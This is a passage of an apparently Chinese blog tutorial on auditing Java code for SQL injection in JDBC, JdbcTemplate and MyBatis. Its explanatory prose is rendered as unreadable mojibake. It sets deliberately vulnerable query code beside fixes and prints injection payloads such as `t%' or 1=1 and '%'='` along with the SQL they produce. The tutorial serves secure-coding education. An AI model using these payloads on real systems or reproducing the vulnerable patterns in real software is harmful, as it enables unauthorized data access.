where id = ?&quot;</span>;<br>    <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> conn.prepareStatement(sql);<br>    st.setString(<span class="hljs-number">1</span>, id);<br>    <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> st.executeQuery();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/b005b26d18d18dbf.png"></p><p>å·²ç»æŸ¥è¯¢ä¸åˆ°å…¨éƒ¨æ•°æ®äº†</p><h2 id="JdbcTemplate"><a href="#JdbcTemplate" class="headerlink" title="JdbcTemplate"></a>JdbcTemplate</h2><p>JdbcTemplate æ˜¯ Spring å¯¹ JDBC çš„å°è£…,ä¾›äº†ç›´æ¥ç¼–å†™æŸ¥è¯¢çš„æ–¹æ³•</p><p>spring JdbcTemplate ç±»çš„æ–¹æ³•</p><table><thead><tr><th>æ–¹æ³•</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>public int update(String query)</td><td>ç”¨äºæ’å…¥ï¼Œæ›´æ–°å’Œåˆ é™¤è®°å½•ã€‚</td></tr><tr><td>public int update(String queryï¼ŒObject â€¦ args)</td><td>ç”¨äºé€šè¿‡ä½¿ç”¨ç»™å®šå‚æ•°çš„PreparedStatementæ’å…¥ï¼Œæ›´æ–°å’Œåˆ é™¤è®°å½•ã€‚</td></tr><tr><td>public void execute(String query)</td><td>ç”¨äºæ‰§è¡ŒDDLæŸ¥è¯¢ã€‚</td></tr><tr><td>public T execute(String sql, PreparedStatementCallback action)</td><td>é€šè¿‡ä½¿ç”¨PreparedStatementå›è°ƒæ‰§è¡ŒæŸ¥è¯¢ã€‚</td></tr><tr><td>public T query(String sql, ResultSetExtractor rse)</td><td>ç”¨äºä½¿ç”¨ResultSetExtractorè·å–è®°å½•ã€‚</td></tr><tr><td>public List query(String sql, RowMapper rse)</td><td>ç”¨äºä½¿ç”¨RowMapperè·å–è®°å½•ã€‚</td></tr></tbody></table><h3 id="æ¼æ´åˆ†æ-2"><a href="#æ¼æ´åˆ†æ-2" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Map&lt;String, Object&gt; <span class="hljs-title function_">vul3</span><span class="hljs-params">(String id)</span> &#123;<br>    <span class="hljs-type">DriverManagerDataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DriverManagerDataSource</span>();<br>    dataSource.setDriverClassName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<br>    dataSource.setUrl(db_url);<br>    dataSource.setUsername(db_user);<br>    dataSource.setPassword(db_pass);<br><br>    <span class="hljs-type">JdbcTemplate</span> <span class="hljs-variable">jdbctemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcTemplate</span>(dataSource);<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where id = &quot;</span> + id;<br><br>    <span class="hljs-comment">// å®‰å…¨ä»£ç ï¼šä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢ï¼Œé¿å…SQLæ³¨å…¥é£é™©</span><br>    <span class="hljs-comment">// String sql = &quot;select * from users where id = ?&quot;;</span><br><br>    <span class="hljs-keyword">return</span> jdbctemplate.queryForMap(sql);<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆæ˜¯å¯¹è¾“å…¥çš„å­—æ®µç›´æ¥è¿›è¡Œæ‹¼æ¥ï¼Œå½¢æˆäº† sql æ³¨å…¥</p><p><img src="https://img.dkdun.cn/v1/2025/12/58b504c4d8510b6d.png"></p><p>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">/</span><span class="hljs-number">2</span><span class="hljs-operator">/</span><span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/5675882969d08cc6.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/4ea9b0ec08c2b8ae.png"></p><p>sql è¯­å¥å°±å˜æˆäº†è¿™æ ·ï¼Œç›´æ¥æ‹¼æ¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="å¼ºåˆ¶æ•°æ®ç±»å‹"><a href="#å¼ºåˆ¶æ•°æ®ç±»å‹" class="headerlink" title="å¼ºåˆ¶æ•°æ®ç±»å‹"></a>å¼ºåˆ¶æ•°æ®ç±»å‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Map&lt;String, Object&gt; <span class="hljs-title function_">safe4</span><span class="hljs-params">(Integer id)</span> &#123;<br>    <span class="hljs-type">DriverManagerDataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DriverManagerDataSource</span>();<br>    dataSource.setDriverClassName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<br>    dataSource.setUrl(db_url);<br>    dataSource.setUsername(db_user);<br>    dataSource.setPassword(db_pass);<br><br>    <span class="hljs-type">JdbcTemplate</span> <span class="hljs-variable">jdbctemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcTemplate</span>(dataSource);<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">sql_vul</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where id = &quot;</span> + id;<br><br>    <span class="hljs-keyword">return</span> jdbctemplate.queryForMap(sql_vul);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœå‚æ•°ç±»å‹ä¸º <code>booleanã€byteã€shortã€intã€longã€floatã€double</code> ç­‰ sql è¯­å¥å°±æ— æ³•æ‹¼æ¥å­—ç¬¦ä¸²</p><p>ä»£ç ä¸­ä¼šæŠŠä¼ å…¥çš„å‚æ•°å¼ºåˆ¶è½¬æ¢æˆ <code>Integer</code> ç±»å‹ï¼Œæ‰€ä»¥å¦‚æœæ˜¯è¾“å…¥äº†åƒå•å¼•å· <code>&#39;</code>  è¿™ç§å­—ç¬¦ï¼Œå°±ä¼šå¯¼è‡´ç±»å‹è½¬æ¢å¤±è´¥ï¼Œæ¯”å¦‚å½“æˆ‘è¾“å…¥äº†ä¸€ä¸ª <code>1&#39;</code> å°±ä¼šå‡ºå¦‚ä¸‹æŠ¥é”™</p><p><img src="https://img.dkdun.cn/v1/2025/12/68e50b528ef960a7.png"></p><h2 id="ESAPIæ¡†æ¶"><a href="#ESAPIæ¡†æ¶" class="headerlink" title="ESAPIæ¡†æ¶"></a>ESAPIæ¡†æ¶</h2><p>The OWASP Enterprise Security APIï¼Œä¸€æ¬¾å¼€æº Web åº”ç”¨ç¨‹åºå®‰å…¨æ§åˆ¶åº“ï¼Œç®€å•æ¥è¯´å°±æ˜¯ä¸ºäº†ç¼–å†™å‡ºæ›´åŠ å®‰å…¨çš„ä»£ç è€Œè®¾è®¡å‡ºæ¥çš„ä¸€äº›APIï¼Œæ–¹ä¾¿ä½¿ç”¨è€…è°ƒç”¨ï¼Œä»è€Œæ–¹ä¾¿çš„ç¼–å†™å®‰å…¨çš„ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">safe3</span><span class="hljs-params">(String id)</span> &#123;<br>    Codec&lt;Character&gt; oracleCodec = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OracleCodec</span>();<br><br>    <span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> conn.createStatement();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where id = &#x27;&quot;</span> + ESAPI.encoder().encodeForSQL(oracleCodec, id) + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br><br>    <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stmt.executeQuery(sql);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>encodeForSQL</code> æ–¹æ³•è¿˜å¯¹è¾“å…¥çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œæ¯”å¦‚å•å¼•å· <code>&#39;</code> ä¼šè¢«è½¬ä¹‰ä¸º <code>&quot;</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/69a35c24c9b56109.png"></p><h2 id="æ­£åˆ™è¿‡æ»¤"><a href="#æ­£åˆ™è¿‡æ»¤" class="headerlink" title="æ­£åˆ™è¿‡æ»¤"></a>æ­£åˆ™è¿‡æ»¤</h2><p>æ¯”å¦‚è¯´åªåŒ¹é…å­—æ¯å’Œæ•°å­—</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">safe5</span><span class="hljs-params">(String name)</span> &#123;<br>    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">pattern</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>;<br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">isValid</span> <span class="hljs-operator">=</span> Pattern.matches(pattern, name);<br><br>    <span class="hljs-keyword">if</span> (isValid) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class.forName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<br>            <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DriverManager.getConnection(db_url, db_user, db_pass);<br>            <span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> conn.createStatement();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where user = &#x27;&quot;</span> + name + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>            <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stmt.executeQuery(sql);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;éæ³•æ­£åˆ™åŒ¹é…ï¼&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>name</code> çš„å€¼å¿…é¡»è¦ç­‰äºä¸€ä¸ªæ•°æ®åº“ä¸­æœ‰çš„æ•°æ®ï¼Œæœ‰æ•ˆé¢„é˜²äº†æ³¨å…¥</p><p><img src="https://img.dkdun.cn/v1/2025/12/74a329f6940b82a2.png"></p><h1 id="MyBatis"><a href="#MyBatis" class="headerlink" title="MyBatis"></a>MyBatis</h1><h2 id="order-by-æ³¨å…¥"><a href="#order-by-æ³¨å…¥" class="headerlink" title="order by æ³¨å…¥"></a>order by æ³¨å…¥</h2><h3 id="æ¼æ´åˆ†æ-3"><a href="#æ¼æ´åˆ†æ-3" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>ç”±äºä½¿ç”¨ <code>$&#123;&#125;</code> ç›´æ¥æ‹¼æ¥æ•°æ®ï¼Œä»è€Œé€ æˆSQLæ³¨å…¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/vul/order&quot;)</span><br><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">orderBy</span><span class="hljs-params">(String field, String sort)</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.orderBy(field, sort);<br>&#125;<br><br><span class="hljs-comment">// ä¸å®‰å…¨çš„æ³¨è§£å†™æ³•</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> &#123;<br>    <span class="hljs-meta">@Select(&quot;select * from users order by $&#123;field&#125; $&#123;sort&#125;&quot;)</span><br>    List&lt;User&gt; <span class="hljs-title function_">orderBy</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;field&quot;)</span> String field, <span class="hljs-meta">@Param(&quot;sort&quot;)</span> String sort)</span>;<br>&#125;<br><br><span class="hljs-comment">// ä¸å®‰å…¨çš„XMLæ˜ å°„å†™æ³•</span><br>&lt;select id=<span class="hljs-string">&quot;orderBy&quot;</span> resultType=<span class="hljs-string">&quot;com.best.hello.entity.User&quot;</span>&gt;<br>    select * from users order by $&#123;field&#125; $&#123;sort&#125;<br>&lt;/select&gt;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä»£ç ä¸­è°ƒç”¨äº† <code>userMapper</code> æ¥å£ä¸­çš„ <code>orderBy</code> æ–¹æ³•ï¼Œä¼ å…¥å‚æ•° <code>file</code> å’Œ <code>sort</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/b4b38ecd1d3a048e.png"></p><p><code>userMapper</code> æ¥å£çš„ <code>orderBy</code> æ–¹æ³•é€šå¸¸å®ç°åœ¨ MyBatis çš„ XML æ˜ å°„æ–‡ä»¶æˆ–æ³¨è§£ä¸­</p><h4 id="æ³¨è§£å½¢å¼"><a href="#æ³¨è§£å½¢å¼" class="headerlink" title="æ³¨è§£å½¢å¼"></a>æ³¨è§£å½¢å¼</h4><p>å¯ä»¥å‘ç°åœ¨ <code>mapper</code> æ–‡ä»¶å¤¹ä¸‹çš„ <code>UserMapper</code> æ¥å£ä¸­ï¼Œ<code>orderBy</code> æ–¹æ³•åœ¨æ³¨è§£ä¸­çš„å®šä¹‰ä½¿ç”¨äº† <code>$&#123;&#125;</code> è¯­æ³•</p><p><img src="https://img.dkdun.cn/v1/2025/12/33d089e6180ffc4f.png"></p><p><code>$&#123;&#125;</code> æ˜¯ä¸€ä¸ªç®€å•çš„ String æ›¿æ¢ï¼Œå­—ç¬¦ä¸²æ˜¯ä»€ä¹ˆï¼Œè§£æå°±æ˜¯ä»€ä¹ˆï¼Œå‡å¦‚ä¼ çš„å‚æ•°æ˜¯ <code>id</code> (å‡è®¾ <code>id</code>æ˜¯ String ç±»å‹)ï¼Œå¯¹äº <code>order by #&#123;id&#125;</code> ï¼Œå¯¹åº”çš„ sql è¯­å¥å°±æ˜¯ <code>order by &quot;id&quot;</code>ï¼Œå¯¹äº <code>order by $&#123;id&#125;</code>ï¼Œå¯¹åº”çš„ sql è¯­å¥åˆ™æ˜¯ <code>order by id</code>ï¼Œå› æ­¤åœ¨è¿™é‡Œä¼ å…¥çš„  <code>field=3&amp;sort=desc,abs(111111)</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/c33b20dfde45f4a4.png"></p><p>ä¼šè¢«å®Œæ•´æ’å…¥è¯­å¥ä¸­ï¼Œç„¶åç”Ÿæˆ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span> <span class="hljs-keyword">desc</span>,<span class="hljs-built_in">abs</span>(<span class="hljs-number">111111</span>)<br></code></pre></td></tr></table></figure><p>ä»è€Œå¾—åˆ°æ•°æ®åº“ä¸­çš„æ•°æ®</p><h4 id="XML-æ–‡ä»¶å½¢å¼"><a href="#XML-æ–‡ä»¶å½¢å¼" class="headerlink" title="XML æ–‡ä»¶å½¢å¼"></a>XML æ–‡ä»¶å½¢å¼</h4><p>åŒæ · <code>oberBy</code> æ–¹æ³•åœ¨ xml æ–‡ä»¶ä¸­çš„æ˜ å°„ä½¿ç”¨äº† <code>$&#123;&#125;</code> è¯­æ³•ï¼Œæ‰¾åˆ° <code>UserMapper.xml</code> æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/1a43e8d63d75b18a.png"></p><p>é‡‡ç”¨äº† <code>$&#123;&#125;</code> è¯­æ³•ï¼Œé€ æˆäº†æ³¨å…¥</p><h3 id="æ’åºæ˜ å°„"><a href="#æ’åºæ˜ å°„" class="headerlink" title="æ’åºæ˜ å°„"></a>æ’åºæ˜ å°„</h3><p>é‡‡ç”¨æ’åºæ˜ å°„çš„æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/safe/order&quot;)</span><br><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">orderBySafe</span><span class="hljs-params">(String field)</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.orderBySafe(field);<br>&#125;<br><br>&lt;mapper namespace=<span class="hljs-string">&quot;com.best.hello.mapper.UserMapper&quot;</span>&gt;<br>    &lt;select id=<span class="hljs-string">&quot;orderBySafe&quot;</span> resultType=<span class="hljs-string">&quot;com.best.hello.entity.User&quot;</span>&gt;<br>        select * from users<br>        &lt;choose&gt;<br>            &lt;!-- æ ¹æ®å­—æ®µé€‰æ‹©æ’åºæ–¹å¼ï¼Œé¿å… SQL æ³¨å…¥ --&gt;<br>            &lt;when test=<span class="hljs-string">&quot;field == &#x27;id&#x27;&quot;</span>&gt;<br>                order by id desc<br>            &lt;/when&gt;<br>            &lt;when test=<span class="hljs-string">&quot;field == &#x27;user&#x27;&quot;</span>&gt;<br>                order by user desc<br>            &lt;/when&gt;<br>            &lt;otherwise&gt;<br>                &lt;!-- é»˜è®¤æ’åºæ–¹å¼ï¼Œé˜²æ­¢ä¸åˆæ³•è¾“å…¥ --&gt;<br>                order by id asc limit <span class="hljs-number">1</span><br>            &lt;/otherwise&gt;<br>        &lt;/choose&gt;<br>    &lt;/select&gt;<br>&lt;/mapper&gt;<br>                    <br></code></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ç”¨æˆ·è¾“å…¥çš„å€¼åªèƒ½æ˜¯ <code>id</code> æˆ– <code>user</code> æ—¶æ‹¼æ¥å­—æ®µæ‰§è¡Œå…¶è§„åˆ™ï¼Œå…¶ä½™ç›´æ¥é™åˆ¶äº†è¾“å‡º</p><p>æ¯”å¦‚å½“è¾“å…¥ <code>field=idd</code> æ—¶ï¼Œåªæ˜¾ç¤ºå‡º id&#x3D;1 å’Œ 2 çš„æ•°æ®è¡¨</p><p><img src="https://img.dkdun.cn/v1/2025/12/a71b9bbcaef60019.png"></p><h3 id="order-by-æ­£åˆ™è¿‡æ»¤"><a href="#order-by-æ­£åˆ™è¿‡æ»¤" class="headerlink" title="order by æ­£åˆ™è¿‡æ»¤"></a>order by æ­£åˆ™è¿‡æ»¤</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">orderBySafeRe</span><span class="hljs-params">(String field, String sort)</span> &#123;<br>    <span class="hljs-keyword">if</span> (Security.isValidOrder(field) &amp;&amp; Security.isValidSort(sort)) &#123;<br>        <span class="hljs-keyword">return</span> userMapper.orderBy2(field, sort);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> userMapper.orderBy2(<span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-string">&quot;desc&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// æ­£åˆ™è¡¨è¾¾å¼éªŒè¯æ’åºå­—æ®µæ˜¯å¦ä»…åŒ…å«æ•°å­—ã€å­—æ¯ã€åŠ å·æˆ–ä¸‹åˆ’çº¿</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isValidOrder</span><span class="hljs-params">(String content)</span> &#123;<br>    <span class="hljs-keyword">return</span> content.matches(<span class="hljs-string">&quot;[0-9a-zA-Z+_]+&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// ç™½åå•éªŒè¯æ’åºé¡ºåºï¼Œåªå…è®¸ &quot;desc&quot; å’Œ &quot;asc&quot;</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isValidSort</span><span class="hljs-params">(String sort)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;desc&quot;</span>.equalsIgnoreCase(sort) || <span class="hljs-string">&quot;asc&quot;</span>.equalsIgnoreCase(sort);<br>&#125;<br></code></pre></td></tr></table></figure><p>å­—æ®µååªå…è®¸é€šè¿‡æ•°å­—å­—æ¯ä¸‹åˆ’çº¿åŠ å·ï¼Œé¡ºåºæ’åºåªå…è®¸ <code>asc</code> å’Œ <code>dsc</code></p><h2 id="æœç´¢æ³¨å…¥"><a href="#æœç´¢æ³¨å…¥" class="headerlink" title="æœç´¢æ³¨å…¥"></a>æœç´¢æ³¨å…¥</h2><p>ç”±äºåœ¨ <code>LIKE</code> æŸ¥è¯¢ä¸­ä½¿ç”¨ <code>&#39;%$&#123;user&#125;%&#39;</code> å¯¼è‡´ SQL æ³¨å…¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/vul/search&quot;)</span><br><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">searchVul</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;user&quot;)</span> String user)</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.searchVul(user);<br>&#125;<br><br><span class="hljs-comment">// ä¸å®‰å…¨çš„æ³¨è§£</span><br><span class="hljs-meta">@Select(&quot;select * from users where user like &#x27;%$&#123;q&#125;%&#x27;&quot;)</span><br>List&lt;User&gt; <span class="hljs-title function_">search</span><span class="hljs-params">(String q)</span>;<br></code></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ†æ-4"><a href="#æ¼æ´åˆ†æ-4" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>å‘ç°è¾“å…¥çš„å€¼è¢«å¤åˆ¶ç»™å‚æ•° <code>user</code>ï¼Œç„¶åä½¿ç”¨ <code>searchVul()</code> æ–¹æ³•è¿›è¡Œæ“ä½œï¼Œè·Ÿè¿› <code>searchVul()</code> æ–¹æ³•</p><p><img src="https://img.dkdun.cn/v1/2025/12/f0d344afa0bf9f95.png"></p><p> <code>searchVul()</code> æ–¹æ³•é‡‡ç”¨äº† <code>&#39;%$&#123;user&#125;%&#39;</code> æ–¹å¼è¿›è¡Œè¯­å¥æ‹¼æ¥ï¼Œå› ä¸ºä½¿ç”¨äº† <code>$&#123;&#125;</code> è¯­æ³•ï¼Œæ‰€ä»¥è¾“å…¥å¹¶æ²¡æœ‰ç»è¿‡ä»»ä½•å¤„ç†</p><p><img src="https://img.dkdun.cn/v1/2025/12/79038f4a68b673ee.png"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">t%&#x27; or 1=1 and &#x27;%&#x27;=&#x27;<br></code></pre></td></tr></table></figure><p>è¿™æ—¶å€™ï¼Œsql è¯­å¥å°±å˜æˆäº†</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%t%&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;%&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;%&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="å‚æ•°åŒ–"><a href="#å‚æ•°åŒ–" class="headerlink" title="#{} å‚æ•°åŒ–"></a>#{} å‚æ•°åŒ–</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/safe/search&quot;)</span><br><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">searchSafe</span><span class="hljs-params">(String user)</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.searchSafe(user);<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨ MyBatis æ³¨è§£çš„å®‰å…¨æŸ¥è¯¢æ–¹æ³•</span><br><span class="hljs-meta">@Select(&quot;select * from users where user like CONCAT(&#x27;%&#x27;, #&#123;user&#125;, &#x27;%&#x27;)&quot;)</span><br>List&lt;User&gt; <span class="hljs-title function_">queryByUser</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;user&quot;)</span> String user)</span>;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°é‡‡ç”¨äº† <code>CONCAT</code> æ¥è¿›è¡Œæ¨¡ç³ŠæŸ¥è¯¢ï¼Œæ‹¼æ¥ä¸¤ä¸ª <code>%</code> </p><p><img src="https://img.dkdun.cn/v1/2025/12/5d6b21859232485e.png"></p><h3 id="å¼ºåˆ¶æ•°æ®ç±»å‹-1"><a href="#å¼ºåˆ¶æ•°æ®ç±»å‹-1" class="headerlink" title="å¼ºåˆ¶æ•°æ®ç±»å‹"></a>å¼ºåˆ¶æ•°æ®ç±»å‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/safe/id/&#123;id&#125;&quot;)</span><br><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">queryById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Integer id)</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.queryByIdAsInterger(id);<br>&#125;<br><br><span class="hljs-meta">@Select(&quot;select * from users where 